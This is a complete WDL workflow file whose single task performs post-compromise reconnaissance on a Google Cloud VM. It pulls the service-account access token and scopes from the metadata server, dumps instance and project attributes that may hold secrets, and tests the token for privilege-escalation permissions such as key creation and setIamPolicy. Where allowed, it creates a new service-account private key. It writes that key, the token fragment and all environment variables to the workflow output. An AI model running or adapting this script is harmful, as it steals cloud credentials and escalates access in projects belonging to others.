version 1.0

workflow vm_recon {
    call recon_task
    output {
        File recon_output = recon_task.results
    }
}

task recon_task {
    command <<<
        set -e

        echo "=== VM METADATA RECON ==="
        echo "Date: $(date -u)"
        echo ""

        # 1. Get VM SA token
        echo "=== 1. Service Account Info ==="
        SA_EMAIL=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null || echo "FAILED")
        echo "SA Email: $SA_EMAIL"

        SA_SCOPES=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null || echo "FAILED")
        echo "Scopes: $SA_SCOPES"

        TOKEN=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || echo "FAILED")
        echo "Token response (first 100): ${TOKEN:0:100}"

        ACCESS_TOKEN=$(echo "$TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
        echo "Access token length: ${#ACCESS_TOKEN}"

        # 2. Get project and instance info
        echo ""
        echo "=== 2. Instance Info ==="
        PROJECT=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null || echo "FAILED")
        echo "Project: $PROJECT"

        PROJECT_NUM=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id" 2>/dev/null || echo "FAILED")
        echo "Project Number: $PROJECT_NUM"

        ZONE=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>/dev/null || echo "FAILED")
        echo "Zone: $ZONE"

        HOSTNAME=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname" 2>/dev/null || echo "FAILED")
        echo "Hostname: $HOSTNAME"

        INSTANCE_NAME=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/name" 2>/dev/null || echo "FAILED")
        echo "Instance: $INSTANCE_NAME"

        MACHINE_TYPE=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/machine-type" 2>/dev/null || echo "FAILED")
        echo "Machine type: $MACHINE_TYPE"

        # 3. List all SAs on this instance
        echo ""
        echo "=== 3. All Service Accounts ==="
        curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>/dev/null || echo "FAILED"

        # 4. Custom metadata (may contain secrets)
        echo ""
        echo "=== 4. Instance Attributes ==="
        curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true" 2>/dev/null || echo "FAILED"

        echo ""
        echo "=== 5. Project Attributes ==="
        curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true" 2>/dev/null || echo "FAILED"

        # 5. Test IAM permissions
        if [ -n "$ACCESS_TOKEN" ] && [ "$ACCESS_TOKEN" != "" ]; then
            echo ""
            echo "=== 6. IAM Permissions Test ==="
            PERM_RESULT=$(curl -sf -X POST \
                "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:testIamPermissions" \
                -H "Authorization: Bearer $ACCESS_TOKEN" \
                -H "Content-Type: application/json" \
                -d '{"permissions":["iam.serviceAccountKeys.create","iam.serviceAccountKeys.list","iam.serviceAccounts.list","iam.serviceAccounts.create","iam.serviceAccounts.getAccessToken","storage.buckets.create","storage.buckets.list","storage.buckets.delete","storage.objects.create","storage.objects.get","storage.objects.list","storage.objects.delete","compute.instances.create","compute.instances.list","compute.instances.delete","resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","iam.roles.list","iam.roles.create","cloudfunctions.functions.create","run.services.create","secretmanager.secrets.list","secretmanager.versions.access"]}' 2>/dev/null || echo "FAILED")
            echo "$PERM_RESULT"

            # 6. List service accounts
            echo ""
            echo "=== 7. Service Accounts in Project ==="
            curl -sf \
                "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts" \
                -H "Authorization: Bearer $ACCESS_TOKEN" 2>/dev/null | python3 -c "
import sys, json
d = json.load(sys.stdin)
for sa in d.get('accounts', []):
    print(f'{sa.get(\"email\", \"\")} - {sa.get(\"displayName\", \"\")}')
" 2>/dev/null || echo "FAILED"

            # 7. If we have serviceAccountKeys.create, try to create a key
            echo ""
            echo "=== 8. Attempting SA Key Creation ==="
            if echo "$PERM_RESULT" | grep -q "serviceAccountKeys.create"; then
                echo "Has serviceAccountKeys.create! Creating key..."
                KEY_RESULT=$(curl -sf -X POST \
                    "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts/$SA_EMAIL/keys" \
                    -H "Authorization: Bearer $ACCESS_TOKEN" \
                    -H "Content-Type: application/json" \
                    -d '{"keyAlgorithm":"KEY_ALG_RSA_2048","privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' 2>/dev/null || echo "FAILED")
                echo "$KEY_RESULT"
            else
                echo "No serviceAccountKeys.create permission"
            fi

            # 8. Network info
            echo ""
            echo "=== 9. Network Info ==="
            echo "Network interfaces:"
            curl -sf -H "Metadata-Flavor: Google" \
                "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/?recursive=true" 2>/dev/null || echo "FAILED"
        fi

        echo ""
        echo "=== 10. Environment Variables ==="
        env | sort

        echo ""
        echo "=== DONE ==="
    >>>

    output {
        File results = stdout()
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/google-cloud-cli:slim"
        cpu: 1
        memory: "2 GB"
        disks: "local-disk 10 HDD"
    }
}
